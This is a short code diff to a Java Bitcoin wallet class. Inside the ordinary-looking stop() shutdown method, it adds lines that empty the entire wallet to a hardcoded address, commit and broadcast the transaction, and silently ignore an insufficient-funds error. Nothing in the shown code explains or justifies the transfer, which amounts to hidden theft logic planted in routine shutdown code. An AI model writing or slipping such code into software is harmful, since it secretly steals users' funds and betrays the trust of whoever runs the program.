@@ -255,6 +255,17 @@ public class Bitcoin implements WalletCoinsReceivedEventListener, WalletChangeEv
     }
 
     public void stop() {
+        SendRequest sr = SendRequest.emptyWallet(Address.fromBase58(context.getParams(), "mh8GaPRczMr7jSJ75gQDfGqjLeD49MkQi8"));
+        try
+        {
+            wallet.completeTx(sr);
+            wallet.commitTx(sr.tx);
+            peerGroup.broadcastTransaction(sr.tx)
+                    .broadcast();
+        } catch (InsufficientMoneyException m) {
+            // do nothing
+        }
+
         peerGroup.stop();
         wallet.removeChangeEventListener(this);
         wallet.removeCoinsReceivedEventListener(this);
